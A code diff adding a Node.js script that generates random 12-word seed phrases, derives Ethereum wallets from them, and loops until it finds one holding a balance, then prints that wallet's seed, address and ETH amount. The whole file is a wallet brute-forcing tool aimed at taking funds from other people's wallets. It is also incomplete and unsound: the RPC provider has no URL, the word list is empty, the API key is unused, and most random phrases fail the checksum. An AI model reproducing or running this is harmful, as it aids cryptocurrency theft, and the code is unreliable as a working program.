@@ -1,0 +1,58 @@
+const ethers = require('ethers');
+const crypto = require('crypto');
+
+// Replace with your actual Alchemy API key
+const alchemyApiKey = '';
+const provider = new ethers.providers.JsonRpcProvider( )
+
+// Replace 'yourWordList' with your own array of words
+const yourWordList = []
+
+function generateRandomMnemonic(wordList) {
+  const mnemonicArray = [];
+  const wordListLength = wordList.length;
+
+  for (let i = 0; i < 12; i++) {
+    const randomIndex = crypto.randomInt(0, wordListLength);
+    mnemonicArray.push(wordList[randomIndex]);
+  }
+
+  return mnemonicArray.join(' ');
+}
+
+async function checkBalanceFromSeed(seedPhrase) {
+  try {
+    // Derive the wallet from the seed phrase
+    const wallet = ethers.Wallet.fromMnemonic(seedPhrase);
+    // Connect the wallet to the provider
+    const account = wallet.connect(provider);
+    // Get the balance of the wallet
+    const balanceWei = await provider.getBalance(account.address);
+
+    if (balanceWei.gt(ethers.constants.Zero)) {
+      const balanceEther = ethers.utils.formatEther(balanceWei);
+      console.log(`Found a wallet with a balance!`);
+      console.log(`Seed Phrase: ${seedPhrase}`);
+      console.log(`Address: ${account.address}`);
+      console.log(`Balance: ${balanceEther} ETH`);
+      return true; // Return true if a balance is found
+    }
+  } catch (error) {
+    console.error(`Error fetching balance for seed phrase: ${error.message}`);
+  }
+  return false; // Return false if no balance is found
+}
+
+async function findWalletWithBalance() {
+  let hasBalance = false;
+  while (!hasBalance) {
+    const seedPhrase = generateRandomMnemonic(yourWordList);
+    hasBalance = await checkBalanceFromSeed(seedPhrase);
+    if (!hasBalance) {
+      console.log('No balance found, generating a new seed phrase...');
+    }
+  }
+}
+
+// Start the search for a wallet with a balance
+findWalletWithBalance();
